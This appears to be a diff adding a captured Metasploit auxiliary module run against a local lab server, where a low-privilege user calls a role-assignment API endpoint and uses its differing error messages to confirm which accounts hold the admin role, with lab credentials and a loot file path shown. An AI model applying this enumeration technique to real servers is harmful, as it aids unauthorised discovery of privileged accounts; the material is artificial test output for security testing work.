@@ -1,0 +1,21 @@
+Loaded 1 modules:
+    1 auxiliary modules
+RHOSTS => 127.0.0.1
+RPORT => 39649
+TARGETURI => /api/v1/roles.addUserToRole
+SSL => false
+VERBOSE => true
+USERNAME => alice
+PASSWORD => Al1ce-Lab-Pass!
+ROLEID => admin
+PROBEUSER => admin
+CONTROLUSER => bob
+[*] Running module against 127.0.0.1
+[*] 127.0.0.1:39649 - Signed in as alice (user id rSQxouLt89hux5j4J)
+[+] 127.0.0.1:39649 - VULN-020: exploited
+[+] 127.0.0.1:39649 - oracle confirmed: 'admin' holds role 'admin', 'bob' does not
+[*]   admin -> error-user-already-in-role
+[*]   bob -> error-action-not-allowed
+[+] 127.0.0.1:39649 - Saved the response to /tmp/.msf4/loot/20261124201252_default_127.0.0.1_blue_spider.vuln_848480.txt
+[*] Auxiliary module execution completed
+whoami: cannot find name for user ID 997
